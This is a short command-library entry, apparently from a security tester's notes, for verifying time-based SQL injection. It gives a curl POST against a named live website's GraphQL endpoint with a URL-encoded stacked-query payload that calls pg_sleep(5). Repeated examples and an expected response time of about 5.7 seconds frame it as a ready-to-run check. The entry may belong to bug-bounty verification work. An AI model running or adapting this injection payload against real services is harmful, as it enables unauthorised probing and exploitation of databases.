---
data: >-
  time curl -X POST
  https://hackerone.com/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep%285%29%3B--%27
tags:
  - timing-attack
  - verification
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:09.931Z'
id: f16474a8-8e5e-443b-9498-63b961b38302
verified: false
validated: true
submitted: true
---
# time-curl-5s-sleep

## Command

```bash
time curl -X POST https://hackerone.com/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep%285%29%3B--%27
```

## Description

Times a 5-second sleep injection for timing verification.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `time` | Execution timer | Yes |
| Payload | 5s pg_sleep | Yes |

## Examples

### Basic Usage

```bash
time curl -X POST https://hackerone.com/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep%285%29%3B--%27
```

## Expected Output

~5.726s total time.

## Related

- [[commands/time-curl-1s-sleep]]
- [[procedures/Verify-Injection-Using-Timing-Attacks-with-pg_sleep]]
